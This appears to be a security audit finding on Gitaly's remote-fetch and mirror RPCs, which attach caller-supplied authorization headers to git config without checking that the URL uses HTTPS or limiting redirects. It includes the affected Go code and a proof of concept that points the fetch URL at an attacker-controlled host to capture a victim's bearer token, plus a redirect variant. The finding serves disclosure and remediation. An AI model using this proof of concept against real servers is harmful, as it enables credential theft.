### Title
Authorization Header Injected into Git HTTP Config Without Enforcing TLS Scheme - (File: internal/gitaly/service/repository/fetch_remote.go)

### Summary
Gitaly's remote-fetch and mirror RPCs let a caller supply an arbitrary `RemoteUrl`/`Url` together with an `HttpAuthorizationHeader` value. The header is injected verbatim into Git's `http.<url>.extraHeader` configuration without any check that the URL uses `https://`. If the caller supplies (or a repository/project is configured with) a plain `http://` remote URL, the caller-supplied bearer/PAT token is transmitted to that remote host as cleartext, and — because the extraHeader key is scoped per literal URL rather than per host with redirect protections — the token can also be replayed to any URL an attacker-controlled or misconfigured server redirects the request to.

### Finding Description
`buildCommandOpts` in `FetchRemote` builds the git command configuration directly from request fields with no scheme validation: [1](#0-0) 

The same unauthenticated, no-TLS-check pattern is repeated in the sibling RPCs that accept caller-supplied URLs and authorization headers:
- `FindRemoteRootRef`: [2](#0-1) 
- `UpdateRemoteMirror`: [3](#0-2) 
- `CreateRepositoryFromURL`: [4](#0-3) 

In each case, the RPC's `validate*Request` function only checks that the URL field is non-empty; there is no requirement that the scheme be `https`: [5](#0-4) 

Because `http.<url>.extraHeader` is set for the literal URL string (not restricted to a specific host, TLS transport, or redirect target), any bearer/PAT token passed through `HttpAuthorizationHeader` will be transmitted:
1. In cleartext if the caller supplies (or the stored remote/import URL uses) `http://` instead of `https://`, exposing the token to anyone on the network path (analogous to KZG-02's "Bearer token sent without TLS").
2. To any server the initial request is redirected to by default git http redirect handling, since there is no `http.followRedirects`/host restriction accompanying the `extraHeader` config, unless the underlying git client's global defaults are already hardened (not evident in this code path).

This is reachable through ordinary user-driven flows: fetching from a remote (mirror pull, project import/mirroring), pushing to a mirror, or resolving the default branch of an external remote — all of which pass an attacker/user-controlled URL and, in typical GitLab usage, a PAT/OAuth token as `HttpAuthorizationHeader`.

### Impact Explanation
If any of these RPCs is invoked with an `http://` URL (whether because the user configured a plaintext mirror/import URL, or the URL is otherwise attacker-influenced), the bearer/PAT credential used to authenticate the outbound git operation is disclosed in cleartext to any network observer or man-in-the-middle between Gitaly and the remote endpoint. Because the header is tied to the literal request URL without redirect containment, a malicious or compromised remote can also redirect the fetch to a different host and still receive the `Authorization` header, resulting in token exfiltration to an unintended, potentially attacker-controlled origin. This is credential disclosure of the caller's authorization token for the affected repository/mirror/import operation.

### Likelihood Explanation
Likelihood is moderate: exploitation only requires that the fetch/mirror/import/URL-based clone target use `http://` rather than `https://`, or that the legitimate `https://` target subsequently issues a redirect to a different (possibly attacker-controlled) URL — both of which are plausible in real-world remote/mirror/import configurations and require no special privilege beyond the ability to configure a remote URL or trigger a fetch/mirror/import RPC.

### Recommendation
Before attaching `HttpAuthorizationHeader` as `http.<url>.extraHeader`, validate that the target URL scheme is `https://` and reject (or strip the header for) plaintext `http://` URLs. Additionally, scope the extraHeader with `http.followRedirects=false` (or an explicit safe redirect policy) so the Authorization header is not replayed to a different or redirected host, and ensure `CreateRepositoryFromURL`'s inline `user:pass@` credential extraction also enforces `https`.

### Proof of Concept
1. Invoke `RepositoryService.FetchRemote` (or `RemoteService.FindRemoteRootRef` / `UpdateRemoteMirror`) with:
   - `RemoteParams.Url = "http://attacker-or-monitored-host/example.git"`
   - `RemoteParams.HttpAuthorizationHeader = "Bearer <victim-token>"`
2. Gitaly sets `http.http://attacker-or-monitored-host/example.git.extraHeader = "Authorization: Bearer <victim-token>"` and runs `git fetch`, sending the `Authorization` header over plaintext HTTP to the attacker-controlled or network-observable host, disclosing `<victim-token>`.
3. Alternatively, point the URL at an HTTPS host that responds with an HTTP 3xx redirect to a different (attacker-controlled) host; git will follow the redirect and resend the same `Authorization` header to the new destination, since no redirect restriction accompanies the extraHeader configuration.

func buildCommandOpts(ctx context.Context, opts *localrepo.FetchOpts, req *gitalypb.FetchRemoteRequest) error {
	remoteURL := req.GetRemoteParams().GetUrl()
	var config []gitcmd.ConfigPair

	for _, refspec := range getRefspecs(req.GetRemoteParams().GetMirrorRefmaps()) {
		config = append(config, gitcmd.ConfigPair{
			Key: "remote.inmemory.fetch", Value: refspec,
		})
	}

	if resolvedAddress := req.GetRemoteParams().GetResolvedAddress(); resolvedAddress != "" {
		modifiedURL, resolveConfig, err := gitcmd.GetURLAndResolveConfig(remoteURL, resolvedAddress)
		if err != nil {
			return fmt.Errorf("couldn't get curloptResolve config: %w", err)
		}

		remoteURL = modifiedURL
		config = append(config, resolveConfig...)
	}

	config = append(config, gitcmd.ConfigPair{Key: "remote.inmemory.url", Value: remoteURL})

	if featureflag.FetchRemoteProactiveAuth.IsEnabled(ctx) {
		if u, err := url.Parse(remoteURL); err == nil && u.User != nil {
			password, _ := u.User.Password()
			if u.User.Username() != "" && password != "" {
				config = append(config, gitcmd.ConfigPair{
					Key:   "http.proactiveAuth",
					Value: "basic",
				})
			}
		}
	}

	if authHeader := req.GetRemoteParams().GetHttpAuthorizationHeader(); authHeader != "" {
		config = append(config, gitcmd.ConfigPair{
			Key:   fmt.Sprintf("http.%s.extraHeader", req.GetRemoteParams().GetUrl()),
			Value: "Authorization: " + authHeader,
		})
	}

func (s *server) validateFetchRemoteRequest(ctx context.Context, req *gitalypb.FetchRemoteRequest) error {
	if err := s.locator.ValidateRepository(ctx, req.GetRepository()); err != nil {
		return structerr.NewInvalidArgument("%w", err)
	}

	if req.GetRemoteParams() == nil {
		return structerr.NewInvalidArgument("missing remote params")
	}

	if req.GetRemoteParams().GetUrl() == "" {
		return structerr.NewInvalidArgument("blank or empty remote URL")
	}

	return nil
}
